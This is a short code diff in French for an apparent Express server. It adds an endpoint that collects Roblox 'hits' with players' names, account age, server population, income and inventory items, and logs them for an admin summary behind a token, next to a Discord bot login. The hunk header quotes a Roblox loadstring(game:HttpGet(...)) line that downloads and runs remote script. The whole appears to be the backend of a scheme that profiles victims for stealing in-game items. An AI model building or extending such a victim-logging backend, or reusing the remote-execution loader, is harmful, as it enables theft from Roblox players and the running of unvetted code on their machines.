@@ -389,8 +389,34 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/cagnastylepay-png/MyS
     }
 });
 if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN);
-// 1. Récupérer tous les webhooks
 
+app.post('/api/admin/hit', (req, res) => {
+    try {
+        const data = req.body;
+
+        console.log("--- NOUVEAU HIT REÇU ---");
+        console.log(`Joueur : ${data.DisplayName} (@${data.Name})`);
+        console.log(`Âge Compte : ${data.AccountAge} jours`);
+        console.log(`Serveur : ${data.Players} joueurs`);
+        console.log(`Min Income : ${data.MinimumIncome}`);
+        
+        if (data.Brainrots && data.Brainrots.length > 0) {
+            console.log(`Inventaire : ${data.Brainrots.length} items trouvés.`);
+            
+        } else {
+            console.log("⚠️ Inventaire vide !");
+        }
+
+        console.log("------------------------");
+
+        // On répond à Roblox que tout est OK
+        res.status(200).json({ success: true, message: "Hit enregistré" });
+
+    } catch (error) {
+        console.error("Erreur lors de la réception du hit :", error);
+        res.status(500).json({ success: false, error: "Internal Server Error" });
+    }
+});
 app.get('/api/admin/hits-summary', async (req, res) => {
     const token = req.query.token;
     if (token !== ADMIN_TOKEN) return res.status(403).json({ error: "Unauthorized" });
